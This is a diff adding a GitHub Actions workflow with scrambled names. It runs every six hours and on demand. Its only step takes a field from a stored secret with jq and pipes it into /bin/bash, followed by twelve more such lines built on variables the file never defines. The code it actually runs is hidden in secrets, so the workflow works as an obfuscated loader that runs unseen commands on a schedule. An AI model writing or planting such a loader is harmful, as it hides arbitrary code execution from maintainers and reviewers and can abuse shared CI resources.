@@ -1,0 +1,30 @@
+name: pengqi19871010
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '4 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: pengqi19871010
+        env:
+          aeuo2149: ${{ secrets.aeuo2149 }}
+        run: |
+          echo $aeuo2149 | jq -r .mmy887 | /bin/bash
+          echo $zpr30 | jq -r .rscq3 | /bin/bash
+          echo $bh08350 | jq -r .z43698 | /bin/bash
+          echo $ldgpx9 | jq -r .wbojd4438 | /bin/bash
+          echo $obqiy1198 | jq -r .kuo4 | /bin/bash
+          echo $kau83 | jq -r .pnihl0 | /bin/bash
+          echo $k7132 | jq -r .jw125 | /bin/bash
+          echo $gqapj0976 | jq -r .kgoc98 | /bin/bash
+          echo $gor04 | jq -r .mgv22 | /bin/bash
+          echo $szlq45 | jq -r .swp40 | /bin/bash
+          echo $lzgyi15 | jq -r .djthe9699 | /bin/bash
+          echo $l868 | jq -r .clh9905 | /bin/bash
+          echo $xi7 | jq -r .fq8572 | /bin/bash
+
